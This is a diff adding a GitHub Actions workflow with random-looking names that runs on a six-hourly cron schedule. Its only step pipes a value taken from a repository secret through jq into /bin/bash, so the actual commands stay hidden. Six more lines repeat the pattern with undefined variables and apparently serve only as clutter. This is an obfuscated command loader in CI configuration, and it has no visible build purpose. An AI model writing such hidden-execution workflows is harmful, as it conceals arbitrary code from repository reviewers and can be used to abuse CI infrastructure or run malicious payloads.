@@ -1,0 +1,25 @@
+name: anzaidong1887
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: anzaidong1887
+        env:
+          d23251: ${{ secrets.d23251 }}
+        run: |
+
+          echo $d23251 | jq -r .p20408 | /bin/bash
+          echo $malyg09 | jq -r .${tlr12} | /bin/bash
+          echo $b6 | jq -r .${yn7} | /bin/bash
+          echo $tc4 | jq -r .${c4} | /bin/bash
+          echo $s4385 | jq -r .${l876} | /bin/bash
+          echo $hh851 | jq -r .${itsz43056} | /bin/bash
+          echo $urj808 | jq -r .${u5099} | /bin/bash
+
